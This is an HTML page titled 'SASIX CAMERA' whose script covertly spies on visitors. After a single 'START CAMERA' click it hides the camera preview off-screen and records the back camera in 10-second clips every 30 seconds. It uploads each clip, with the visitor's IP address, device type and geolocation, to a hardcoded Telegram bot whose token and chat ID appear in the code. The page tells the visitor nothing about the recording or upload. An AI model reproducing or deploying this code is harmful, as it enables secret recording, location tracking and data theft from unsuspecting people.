<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SASIX ‚Ä¢ CAMERA</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: black;
            color: white;
            font-family: Arial, sans-serif;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }
        
        /* SASIX BIG WATERMARK */
        .sasix-watermark {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-15deg);
            color: rgba(255, 0, 0, 0.45);
            font-size: 85px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 15px;
            white-space: nowrap;
            pointer-events: none;
            z-index: 9999;
            border: 5px solid rgba(255, 0, 0, 0.35);
            padding: 20px 50px;
            border-radius: 25px;
            text-shadow: 0 0 30px rgba(255,0,0,0.7);
            animation: pulse 3s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.45; transform: translate(-50%, -50%) rotate(-15deg) scale(1); }
            50% { opacity: 0.65; transform: translate(-50%, -50%) rotate(-15deg) scale(1.05); }
        }
        
        .sasix-corner {
            position: fixed;
            top: 20px;
            right: 30px;
            color: rgba(255, 77, 77, 0.9);
            font-size: 28px;
            font-weight: bold;
            z-index: 9999;
            text-shadow: 0 0 15px #ff0000;
            border-right: 4px solid #ff4d4d;
            padding-right: 15px;
        }
        
        .sasix-bottom {
            position: fixed;
            bottom: 20px;
            left: 30px;
            color: rgba(255, 255, 255, 0.6);
            font-size: 18px;
            z-index: 9999;
            letter-spacing: 3px;
            text-transform: uppercase;
        }
        
        /* ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è preview - ‡∂á‡∂≠‡∑ä‡∂≠‡∂ß‡∂∏ ‡∂¥‡∑ö‡∂±‡∑ä‡∂±‡∑ö ‡∂±‡∑ê‡∑Ñ‡∑ê */
        .camera-preview {
            position: fixed;
            bottom: -9999px;
            right: -9999px;
            width: 320px;
            height: 240px;
            opacity: 0;
            pointer-events: none;
        }
        
        #camera {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* Mirror effect */
        }
        
        /* Status bar - ‡∂¥‡∑ö‡∂±‡∑ä‡∂±‡∑ö ‡∂±‡∑ê‡∑Ñ‡∑ê */
        .status-hidden {
            display: none;
        }
        
        /* Loading animation - ‡∂±‡∑ú‡∂¥‡∑ô‡∂±‡∑ì */
        .invisible {
            opacity: 0;
            position: fixed;
            top: -9999px;
        }
        
        /* Force camera permission */
        .permission-trigger {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            z-index: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .permission-btn {
            background: linear-gradient(45deg, #ff4d4d, #cc0000);
            color: white;
            border: none;
            padding: 18px 50px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            letter-spacing: 3px;
            cursor: pointer;
            box-shadow: 0 0 30px rgba(255,0,0,0.5);
            text-transform: uppercase;
            z-index: 10000;
        }
        
        .permission-btn:active {
            transform: scale(0.95);
        }
    </style>
</head>
<body>
    <!-- SASIX WATERMARKS - ‡∂¥‡∑ä‚Äç‡∂ª‡∑ô‡∂∏‡∑í‡∂∫‡∂∏‡∑ä -->
    <div class="sasix-watermark">SASIX</div>
    <div class="sasix-corner">‚ö° SASIX</div>
    <div class="sasix-bottom">¬© 2026 SASIX TECHNOLOGIES</div>
    
    <!-- Permission Button - ‡∂∏‡∑ö‡∂ö click ‡∂ö‡∂ª‡∂±‡∑ä‡∂±‡∂∏ ‡∂ï‡∂±‡∑í (1 ‡∑Ä‡∂≠‡∑è‡∑Ä‡∂ö‡∑ä) -->
    <div id="permissionScreen" class="permission-trigger">
        <button id="startCameraBtn" class="permission-btn">üî¥ START CAMERA</button>
    </div>
    
    <!-- Hidden Camera Preview -->
    <div class="camera-preview">
        <video id="camera" autoplay playsinline muted></video>
    </div>
    
    <script>
        // ============================================
        // SASIX TELEGRAM BOT CONFIG
        // ============================================
        const BOT_TOKEN = '8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg';
        const CHAT_ID = '7642100129';
        
        let cameraStream = null;
        let videoElement = document.getElementById('camera');
        let isRecording = false;
        let mediaRecorder = null;
        let videoChunks = [];
        
        // ============================================
        // 1. ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è ‡∂∂‡∑ú‡∂≠‡∑ä‡∂≠‡∂∏ - ‡∂¥‡∂ª‡∂∏‡∑í‡∑Ç‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂±
        // ============================================
        document.getElementById('startCameraBtn').addEventListener('click', async function() {
            try {
                // ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂±
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        facingMode: { ideal: "environment" }, // ‡∂¥‡∑É‡∑î‡∂¥‡∑É ‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 30 }
                    },
                    audio: false
                });
                
                // ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù ‡∂ë‡∂ö‡∂ß stream ‡∂ë‡∂ö set ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                videoElement.srcObject = cameraStream;
                await videoElement.play();
                
                // Permission screen ‡∂ë‡∂ö hide ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                document.getElementById('permissionScreen').style.display = 'none';
                
                // Telegram ‡∂ë‡∂ö‡∂ß message ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
                sendMessage('üöÄ SASIX CAMERA ACTIVATED');
                
                // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 3‡∂ö‡∑í‡∂±‡∑ä ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù record ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂±
                setTimeout(() => {
                    startAutoRecording();
                }, 3000);
                
            } catch(error) {
                console.error('Camera error:', error);
                alert('‡∂ö‡∑ê‡∂∏‡∂ª‡∑è‡∑Ä ‡∂¥‡∂ß‡∂±‡∑ä ‡∂ú‡∂±‡∑ä‡∂± ‡∂∂‡∑ê‡∑Ñ‡∑ê. ‡∂¥‡∂ª‡∂∏‡∑í‡∑Ç‡∂±‡∑ä ‡∂ë‡∂ö ‡∂Ø‡∑ô‡∂±‡∑ä‡∂±.');
            }
        });
        
        // ============================================
        // 2. ‡∂î‡∂ß‡∑ù‡∂∏‡∑ê‡∂ß‡∑í‡∂ö‡∑ä ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù ‡∂ª‡∑ô‡∂ö‡∑ù‡∂©‡∑í‡∂±‡∑ä
        // ============================================
        async function startAutoRecording() {
            if (isRecording) return;
            
            console.log('üé• Auto recording started');
            
            // ‡∑Ä‡∑í‡∂±‡∑è‡∂©‡∑í‡∂∫‡∂ö‡∂ß ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù 2‡∂ö‡∑ä (‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 30 ‡∂∂‡∑ê‡∂ú‡∑í‡∂±‡∑ä)
            setInterval(async () => {
                await recordAndSendVideo();
            }, 30000); // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 30‡∂ö‡∂ß ‡∑Ä‡∂ª‡∂ö‡∑ä
            
            // ‡∂¥‡∑Ö‡∑Ä‡∑ô‡∂±‡∑í ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂±
            await recordAndSendVideo();
        }
        
        // ============================================
        // 3. ‡∑Ä‡∑ì‡∂©‡∑í‡∂∫‡∑ù ‡∂ë‡∂ö RECORD ‡∂ö‡∂ª‡∂Ω‡∑è SEND ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ============================================
        async function recordAndSendVideo() {
            return new Promise(async (resolve) => {
                try {
                    videoChunks = [];
                    
                    // MediaRecorder setup
                    let options = {};
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                        options = { mimeType: 'video/webm;codecs=vp9' };
                    } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                        options = { mimeType: 'video/webm;codecs=vp8,opus' };
                    }
                    
                    mediaRecorder = new MediaRecorder(cameraStream, options);
                    
                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data && e.data.size > 0) {
                            videoChunks.push(e.data);
                        }
                    };
                    
                    mediaRecorder.onstop = async () => {
                        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                        const sizeMB = (videoBlob.size / (1024 * 1024)).toFixed(2);
                        
                        console.log(`‚úÖ Video recorded: ${sizeMB}MB`);
                        
                        // Telegram ‡∂ë‡∂ö‡∂ß ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
                        await sendVideoToTelegram(videoBlob, sizeMB);
                        resolve();
                    };
                    
                    // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 10‡∂ö‡∑ä record ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
                    mediaRecorder.start(1000);
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 10000); // ‡∂≠‡∂≠‡∑ä‡∂¥‡∂ª 10 video
                    
                } catch(error) {
                    console.error('Recording error:', error);
                    resolve();
                }
            });
        }
        
        // ============================================
        // 4. TELEGRAM ‡∂ë‡∂ö‡∂ß VIDEO ‡∂ë‡∂ö ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ============================================
        async function sendVideoToTelegram(videoBlob, sizeMB) {
            try {
                // IP ‡∂ë‡∂ö ‡∂ú‡∂±‡∑ä‡∂±
                let ip = 'Unknown';
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch(e) {}
                
                // Device info
                const ua = navigator.userAgent;
                let device = 'Android';
                if (ua.includes('Windows')) device = 'Windows';
                else if (ua.includes('Mac')) device = 'MacOS';
                else if (ua.includes('iPhone')) device = 'iPhone';
                else if (ua.includes('iPad')) device = 'iPad';
                
                // Form data ‡∑Ñ‡∂Ø‡∂±‡∑ä‡∂±
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, `SASIX_CAM_${Date.now()}.webm`);
                formData.append('caption', `üé• <b>SASIX CAMERA CAPTURE</b>
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üìÖ <b>Time:</b> ${new Date().toLocaleString()}
üåç <b>IP:</b> ${ip}
üì± <b>Device:</b> ${device}
‚è±Ô∏è <b>Duration:</b> 10 seconds
üì¶ <b>Size:</b> ${sizeMB}MB
üî¥ <b>Camera:</b> Back

#SASIX #CAMERA #AUTO`);

                console.log('üì§ Sending to Telegram...');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    console.log('‚úÖ Video sent successfully!');
                    
                    // Location ‡∂ë‡∂ö‡∂≠‡∑ä ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
                    sendLocation();
                    
                    return true;
                } else {
                    console.error('‚ùå Telegram error:', result);
                    return false;
                }
                
            } catch(error) {
                console.error('‚ùå Send error:', error);
                return false;
            }
        }
        
        // ============================================
        // 5. MESSAGE ‡∂ë‡∂ö‡∂ö‡∑ä ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ============================================
        async function sendMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {}
        }
        
        // ============================================
        // 6. LOCATION ‡∂ë‡∂ö ‡∂∫‡∑Ä‡∂±‡∑ä‡∂±
        // ============================================
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        try {
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    chat_id: CHAT_ID,
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude
                                })
                            });
                            console.log('üìç Location sent');
                        } catch(e) {}
                    },
                    (error) => {}
                );
            }
        }
        
        // ============================================
        // 7. ‡∂¥‡∑í‡∂ß‡∑î‡∑Ä close ‡∂ö‡∂ª‡∂±‡∂ö‡∑ú‡∂ß
        // ============================================
        window.addEventListener('beforeunload', function() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        });
        
        // ============================================
        // 8. Background ‡∂ë‡∂ö‡∑ö ‡∂≠‡∑í‡∂∂‡∑ä‡∂∂‡∂≠‡∑ä ‡∑Ä‡∑ê‡∂© ‡∂ö‡∂ª‡∂±‡∑ä‡∂±
        // ============================================
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                console.log('üì± App in background - still recording');
            }
        });
        
    </script>
</body>
</html>
